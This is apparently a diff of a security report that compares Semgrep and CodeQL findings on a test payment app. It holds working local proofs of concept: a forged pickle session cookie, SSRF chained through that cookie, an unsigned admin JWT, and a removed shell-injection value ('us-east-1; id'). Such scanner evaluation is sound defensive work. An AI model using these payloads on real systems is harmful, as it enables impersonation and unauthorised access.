@@ -106,7 +106,7 @@ codeql database analyze artifacts/codeql-go \
 | **Maintenance burden** | Repository-owned local rules plus registry/policy review | Query packs plus language-specific build configuration | **Vendor documentation:** rules, query packs, and integrations require ongoing updates |
 
 ## Triage
-Caveat: AI agent assisted analysis. Further reasoned and judgemet by human in the Three-findings evaluation sections.
+Caveat: AI agent assisted analysis. Further reasoned and judgemet by human in the Four-findings evaluation sections.
 
 Legend: **TP** = real, verified by hand · **FP** = flagged but not actually exploitable ·
 **Info/quality** = correctness or style, not a security finding. "Caught by" lists every
@@ -184,55 +184,74 @@ totals were Python 7.23s, JavaScript 12.17s, Java 21.62s, and Go 13.25s.
 These totals include database creation; Semgrep has no database phase.
 
 
-## Three-findings evaluation 
-
-### Case 1: Go command injection
-This is a confirmed command injection in `services/ledger/main.go`.
+## Four-findings evaluation 
+### Case 1: Python insecure deserialization (pickle)
+This is a confirmed insecure deserialization vulnerability in `services/api/auth.py`.
 
 The vulnerable flow is:
 
-1. A JSON request is decoded into a struct.
-2. The `region` value from the request is passed into `reconcile(...)`.
-3. `reconcile(...)` concatenates the user-controlled string directly into a shell command.
-4. The command is executed via `sh -c`, which interprets the text as shell input.
+1. The client sends a `paylink_session` cookie.
+2. The server base64-decodes it and passes the bytes straight to `pickle.loads(...)`, with no signature or integrity check.
+3. Whatever `merchant_id` value the pickle stream reconstructs is trusted as the caller's identity — no check that it belongs to a real merchant.
 
-#### 1) Incoming request is decoded
-```go
-var req syncRequest
-if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-    http.Error(w, "bad request", http.StatusBadRequest)
-    return
-}```
+#### The vulnerable sink
+File: `services/api/auth.py:11-18`
+```python
+def current_merchant(request):
+    raw = request.cookies.get("paylink_session")
+    if not raw:
+        return None
+    blob = base64.b64decode(raw)
+    session = pickle.loads(blob)
+    return session.get("merchant_id")
+```
+Base64 is an encoding, not a security control — nothing proves the cookie was issued by the server. 
 
-#### 2) The request struct contains a user-controlled Region
-```go
-type syncRequest struct {
-    BatchID string `json:"batch_id"`
-    Region  string `json:"region"`
+Forging a cookie:
+```bash
+% python3 -c "
+import pickle, base64
+payload = {'merchant_id': 'mch_test'}
+print(base64.b64encode(pickle.dumps(payload)).decode())"
+gAWVHQAAAAAAAAB9lIwLbWVyY2hhbnRfaWSUjAhtY2hfdGVzdJRzLg==
+```
+The output is a valid paylink_session cookie value that impersonates any
+merchant identity the attacker chooses — no real login, password, or token
+required:
+
+#### Tested locally by bringing up the service
+Making a request using the forged cookie:
+```bash
+% curl -s http://localhost:8080/healthz \        
+  -b "paylink_session=gAWVHQAAAAAAAAB9lIwLbWVyY2hhbnRfaWSUjAhtY2hfdGVzdJRzLg=="
+{
+  "ok": true
 }
-```
 
-#### 3) The value is passed to the vulnerable function
-```go
-out, err := reconcile(req.Region)
-```
-
-#### 4) The vulnerable sink: string concatenation into a shell command
-```go
-func reconcile(region string) ([]byte, error) {
-    return exec.Command("sh", "-c", "/opt/paylink/reconcile --region "+region).CombinedOutput()
-}```
-
-#### If the attacker sends:
-
-```go
-{"region":"us-east-1; id"}
-```
-
-then:
-
-```go
-sh -c "/opt/paylink/reconcile --region us-east-1; id"
+% curl -s http://localhost:8080/v1/transactions \
+  -b "paylink_session=gAWVHQAAAAAAAAB9lIwLbWVyY2hhbnRfaWSUjAhtY2hfdGVzdJRzLg=="
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+  "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+  <head>
+    <title>sqlite3.OperationalError: no such table: transactions // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
+        type="text/css">
+    <!-- We need to make sure this has a favicon so that the debugger does
+         not accidentally trigger a request to /favicon.ico which might
+         change the application's state. -->
+    <link rel="shortcut icon"
+        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script type="text/javascript">
+      var TRACEBACK = 281472758022032,
+          CONSOLE_MODE = false,
+          EVALEX = true,
+          EVALEX_TRUSTED = false,
+          SECRET = "apeFq4b6johUWlUU6mb2";
+    </script>
+  </head>
+..SNIP..
 ```
 
 ## Case 2: Reflected XSS
@@ -340,30 +359,74 @@ The vulnerable sink is:
 ```python
 requests.get(url, timeout=TIMEOUT, allow_redirects=True)
 ```
+#### Tested locally by bringing up the service. Chained Case 1 by forging session cookie. 
 An authenticated attacker could submit:
-```python
+```bash
+% curl -s -X POST http://localhost:8080/v1/webhooks/probe \
+  -H "Content-Type: application/json" \
+  -b "paylink_session=gAWVHQAAAAAAAAB9lIwLbWVyY2hhbnRfaWSUjAhtY2hfdGVzdJRzLg==" \
+  -d '{"url": "http://webhooks:8081/healthz"}'
 {
-  "url": "http://127.0.0.1:8081/health"
+  "body": "{\"ok\":true}", 
+  "status": 200
 }
 ```
-Possible targets include internal services, localhost-only endpoints, private network resources, and cloud metadata endpoints.
+## Case 4: Missing JWT signature verification
+File: verify.js:19-21
 
-### Conclusion from the three cases
+```js
+function replayClaims(token) {
+  return jwt.decode(token);
+}
+```
+Called from server.js:32-36:
 
-1. The Go result demonstrates agreement between Semgrep and CodeQL on an obvious, reachable vulnerability. 
+```js
+app.post('/admin/config', (req, res) => {
+  const claims = replayClaims(req.get('X-Operator-Token'));
+  if (!claims) return res.status(401).json({ error: 'no token' });
+  applyOverrides(req.body || {});
+  res.json(snapshot());
+});
+```
+
+1  Client sends `POST` `/admin/config` with an `X-Operator-Token` header and a JSON body.
+2. `replayClaims(token)` calls `jwt.decode(token)`, which parses the token structurally but checks nothing about its signature.
+
+```python
+ % python3 -c "
+import base64, json
+
+def b64url(d):
+    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
+
+header = b64url(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
+payload = b64url(json.dumps({'role': 'admin', 'sub': 'attacker'}).encode())
+print(f'{header}.{payload}.this-signature-is-never-checked')
+"
+eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFkbWluIiwgInN1YiI6ICJhdHRhY2tlciJ9.this-signature-is-never-checked
+
+syafiq@Syafiqs-MacBook-Air target-app % curl -s -X POST http://localhost:8081/admin/config \
+  -H "Content-Type: application/json" \
+  -H "X-Operator-Token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFkbWluIiwgInN1YiI6ICJhdHRhY2tlciJ9.this-signature-is-never-checked" \
+  -d '{"features": {"replay": true}}'
+{"retries":3,"backoffMs":500,"partners":{},"features":{"replay":true,"strictSignature":true}}%    
+```
+
+### Conclusion from the four cases
+
+1. The pickle deserialization case demonstrates agreement between Semgrep and CodeQL on a critical, reachable vulnerability.
 
 2. The CodeQL XSS result demonstrates why scanner findings require manual review: custom sanitization can produce a false
-positive when it is not modeled by the analyzer. 
+positive when it is not modeled by the analyzer. Even with better data-flow analysis there could still be false positive
 
-3. CodeQL identified a confirmed server-side request forgery vulnerability. An attacker could potentially reach against internal services, private network resources, or cloud metadata endpoints.
+3. CodeQL identified a confirmed server-side request forgery vulnerability, which was verified locally by chaining the forged session cookie from Case 1 into `/v1/webhooks/probe` to reach the internal `webhooks` service — confirming the SSRF is both reachable and exploitable, not just theoretically reachable.
 
+4. The missing JWT signature verification case, caught by Semgrep only, was confirmed exploitable with a completely unsigned token: `jwt.decode()` never validates the signature at all, so `/admin/config` accepted a forged admin token and mutated live server config with no valid credentials whatsoever.
 
 ## Overall assessment
 
-These cases show complementary strengths between Semgrep and CodeQL:
-
-- **Semgrep** was effective at detecting explicit insecure code patterns, including shell execution, SQL concatenation, and HTML construction.
-- **CodeQL** was effective at tracing data from request-controlled sources to security-sensitive sinks, including command execution and outbound network requests.
-- **Custom sanitizers, authentication boundaries, input validation, and application context** materially affect whether a scanner result is exploitable.
+- **Semgrep** was effective at detecting explicit insecure code patterns.
+- **CodeQL** was effective at tracing data from request-controlled sources to security-sensitive sinks.
 
 Semgrep contributes fast pattern-based detection and straightforward rule customization, while CodeQL contributes deeper data-flow analysis and reachability reasoning.
